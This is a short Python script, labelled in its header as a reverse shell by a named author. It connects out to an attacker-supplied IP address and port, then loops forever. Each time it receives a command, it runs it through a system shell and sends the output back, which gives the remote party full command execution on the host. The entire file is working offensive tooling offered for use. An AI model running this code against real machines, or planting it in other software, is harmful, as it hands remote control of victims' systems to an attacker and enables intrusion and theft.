'''
  reverse shell
  author @ Himanshu Bag :-)
'''

import socket
import sys, subprocess,os

if(len(sys.argv[1:])!=2):
    print("[!] Invalid input try again. ")
    print("Usage:- python3 client.py <server_ip> <port_no>")
    sys.exit()

host,port = str(sys.argv[1]),int(sys.argv[2])

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print('[*] Socket Initialized !!!'+'\n')
    # To prevent,
    # OSError: [Errno 98] Address already in use
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

except socket.error as e:
    print('[!] Unable to initiate socket !!')
    print('[!] ERROR :',str(e))
    sys.exit()

try:
    s.connect((host,port))
except socket.error as e:
    print('[!] Unable to connect to Server !!.' + str(e))

while True:
    r= s.recv(1024)
    out_str=''
    if(r[:].decode("utf-8") == 'end shell'):
        break
    if r[:2].decode("utf-8") == 'cd':
        try:
            os.chdir(r[3:].decode("utf-8"))
        except:
            s.send(str.encode('! No such file or directory !'+'\n'+host+' @ ['+str(os.getcwd())+']'))
    if(len(r)>0):
        cmd = subprocess.Popen(r[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        
        out_bytes = cmd.stdout.read() +cmd.stderr.read()
        out_str += str(out_bytes,"utf-8")
        s.send(str.encode(out_str+'\n'+host+'@['+str(os.getcwd())+']'))
    
    

s.close()
